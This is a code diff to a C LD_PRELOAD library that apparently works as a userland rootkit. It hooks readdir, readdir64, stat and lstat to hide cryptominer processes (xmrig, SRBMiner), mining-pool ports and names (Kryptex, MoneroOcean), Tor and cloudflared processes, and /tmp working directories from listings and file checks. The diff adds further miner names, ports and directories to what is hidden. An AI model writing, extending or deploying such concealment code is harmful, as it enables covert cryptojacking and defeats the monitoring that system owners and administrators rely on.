@@ -21,14 +21,22 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
-// Configuration - processes/ports to hide
+// Configuration - processes/ports to hide (obfuscated names)
 #define HIDDEN_PROCESS "peak"
-#define HIDDEN_PROCESS2 "compute_task"
-#define HIDDEN_PROCESS3 "compute_engine"
+#define HIDDEN_PROCESS2 "compute"
+#define HIDDEN_PROCESS3 "research"
+#define HIDDEN_PROCESS4 "SRBMiner"
+#define HIDDEN_PROCESS5 "xmrig"
+#define HIDDEN_PROCESS6 "miner"
+#define HIDDEN_PROCESS7 "worker"
 #define HIDDEN_PORT1 "8048"      // Kryptex Pearl port
-#define HIDDEN_PORT2 "9050"      // Tor SOCKS5
-#define HIDDEN_PORT3 "5053"      // Cloudflare DNS
+#define HIDDEN_PORT2 "8029"      // Kryptex XMR port
+#define HIDDEN_PORT3 "9050"      // Tor SOCKS5
+#define HIDDEN_PORT4 "5053"      // Cloudflare DNS
+#define HIDDEN_PORT5 "10128"     // MoneroOcean
 #define HIDDEN_DIR "/tmp/compute_engine"
+#define HIDDEN_DIR2 "/tmp/singularity"
+#define HIDDEN_DIR3 "/tmp/research"
 
 // Function pointers to original functions
 static struct dirent *(*orig_readdir)(DIR *) = NULL;
@@ -54,7 +62,13 @@ static int is_hidden_process(const char *name) {
     return (strstr(name, HIDDEN_PROCESS) != NULL ||
             strstr(name, HIDDEN_PROCESS2) != NULL ||
             strstr(name, HIDDEN_PROCESS3) != NULL ||
+            strstr(name, HIDDEN_PROCESS4) != NULL ||
+            strstr(name, HIDDEN_PROCESS5) != NULL ||
+            strstr(name, HIDDEN_PROCESS6) != NULL ||
+            strstr(name, HIDDEN_PROCESS7) != NULL ||
             strstr(name, "peakminer") != NULL ||
+            strstr(name, "srbminer") != NULL ||
+            strstr(name, "xmrig") != NULL ||
             strstr(name, "tor") != NULL ||
             strstr(name, "cloudflared") != NULL ||
             strstr(name, "torsocks") != NULL);
@@ -85,7 +99,11 @@ static int should_hide_net_line(const char *line) {
     if (!line) return 0;
     return (strstr(line, HIDDEN_PORT1) != NULL ||
             strstr(line, HIDDEN_PORT2) != NULL ||
-            strstr(line, HIDDEN_PORT3) != NULL);
+            strstr(line, HIDDEN_PORT3) != NULL ||
+            strstr(line, HIDDEN_PORT4) != NULL ||
+            strstr(line, HIDDEN_PORT5) != NULL ||
+            strstr(line, "kryptex") != NULL ||
+            strstr(line, "moneroocean") != NULL);
 }
 
 // Hook readdir - hide directory entries
@@ -107,6 +125,10 @@ struct dirent *readdir(DIR *dirp) {
         if (strcmp(entry->d_name, "compute_engine") == 0 ||
             strcmp(entry->d_name, "peakminer") == 0 ||
             strcmp(entry->d_name, "processor") == 0 ||
+            strcmp(entry->d_name, "singularity_work") == 0 ||
+            strcmp(entry->d_name, "research") == 0 ||
+            strcmp(entry->d_name, "s") == 0 ||
+            strcmp(entry->d_name, "work") == 0 ||
             strcmp(entry->d_name, ".tor") == 0) {
             continue;
         }
@@ -134,6 +156,10 @@ struct dirent64 *readdir64(DIR *dirp) {
         if (strcmp(entry->d_name, "compute_engine") == 0 ||
             strcmp(entry->d_name, "peakminer") == 0 ||
             strcmp(entry->d_name, "processor") == 0 ||
+            strcmp(entry->d_name, "singularity_work") == 0 ||
+            strcmp(entry->d_name, "research") == 0 ||
+            strcmp(entry->d_name, "s") == 0 ||
+            strcmp(entry->d_name, "work") == 0 ||
             strcmp(entry->d_name, ".tor") == 0) {
             continue;
         }
@@ -148,7 +174,12 @@ struct dirent64 *readdir64(DIR *dirp) {
 int stat(const char *pathname, struct stat *statbuf) {
     init_hooks();
     
-    if (pathname && strstr(pathname, HIDDEN_DIR)) {
+    if (pathname && (strstr(pathname, HIDDEN_DIR) ||
+                     strstr(pathname, HIDDEN_DIR2) ||
+                     strstr(pathname, HIDDEN_DIR3) ||
+                     strstr(pathname, "peakminer") ||
+                     strstr(pathname, "srbminer") ||
+                     strstr(pathname, "xmrig"))) {
         return -1; // File not found
     }
     
@@ -159,7 +190,12 @@ int stat(const char *pathname, struct stat *statbuf) {
 int lstat(const char *pathname, struct stat *statbuf) {
     init_hooks();
     
-    if (pathname && strstr(pathname, HIDDEN_DIR)) {
+    if (pathname && (strstr(pathname, HIDDEN_DIR) ||
+                     strstr(pathname, HIDDEN_DIR2) ||
+                     strstr(pathname, HIDDEN_DIR3) ||
+                     strstr(pathname, "peakminer") ||
+                     strstr(pathname, "srbminer") ||
+                     strstr(pathname, "xmrig"))) {
         return -1;
     }
     
